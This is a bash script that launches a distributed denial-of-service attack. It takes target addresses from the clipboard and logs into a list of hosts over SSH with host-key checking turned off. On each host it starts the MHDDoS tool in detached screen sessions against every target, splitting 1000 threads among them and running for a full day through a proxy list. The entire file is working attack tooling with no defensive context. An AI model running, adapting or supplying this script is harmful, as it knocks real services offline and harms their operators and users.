#!/bin/bash

xclip -selection clipboard -o > "$SCRIPT_DIR/targets.txt"

targets_num=$(cat "$SCRIPT_DIR/targets.txt" | wc -l)
threads=$(( 1000 / targets_num ))

DURATION=86400
SOCKS_TYPE=0
PROXY_FILE="proxy-$(date +'%d-%m').txt"

clear
printf "Starting L4 attacks...\n"
while read -r target; do
  echo "TARGET: $target"
  echo "THREADS: $threads"
  echo "COMMAND: screen -d -m python3 ~/MHDDoS/start.py $ATTACK_TYPE $target $threads $DURATION $SOCKS_TYPE $PROXY_FILE"
  while read -r host; do
    ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -n "$USER@$host" "screen -d -m python3 ~/MHDDoS/start.py $ATTACK_TYPE $target $threads $DURATION $SOCKS_TYPE $PROXY_FILE" &
    sleep .1
  done < "$SCRIPT_DIR/hosts.txt"
done < "$SCRIPT_DIR/targets.txt"
wait
exit